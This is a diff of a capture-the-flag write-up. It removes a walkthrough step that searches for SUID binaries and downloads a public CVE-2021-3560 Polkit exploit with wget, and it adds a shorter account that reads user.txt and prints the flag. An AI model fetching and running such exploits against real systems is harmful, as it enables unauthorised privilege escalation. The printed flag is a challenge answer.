@@ -26,6 +26,9 @@ I can see in the bottom left corner the username **thugger** which means this wi
 
 <img width="1918" height="920" alt="image" src="https://github.com/user-attachments/assets/c3575a14-6877-4ba9-851e-4c7224bd24cf" />
 
-First thing's first, I wanted to see what was in the home directory so I used a ls command. I then wanted to display the content of the user.txt file so I used **cat user.txt**. To find regular files, I then used the **find / -perm -u=s -type f 2>/dev/null** command and found a file called **/usr/lib/policykit-1/polkit-agent-helper-1**. I looked this up online and found a python script in someone's github repo so I copied the URL of the raw code and ran the command **wget https://raw.githubusercontent.com/Almorabea/Polkit-exploit/refs/heads/main/CVE-2021-3560.py**. 
+First thing's first, I wanted to see what was in the home directory so I used a ls command. I then wanted to display the content of the user.txt file which was the only file listed so I used **cat user.txt** and found the flag right there: **5C50FC503A2ABE93B4C5EE3425496521**. This was definitely an extremely quick and to the point CTF but still a fun one nonetheless.
 
-<img width="1918" height="920" alt="image" src="https://github.com/user-attachments/assets/182daa93-230c-4a66-9feb-a12a8d9cf67c" />
+<img width="1918" height="920" alt="image" src="https://github.com/user-attachments/assets/e78ce235-9bab-4986-8f39-66465927b261" />
+
+
+
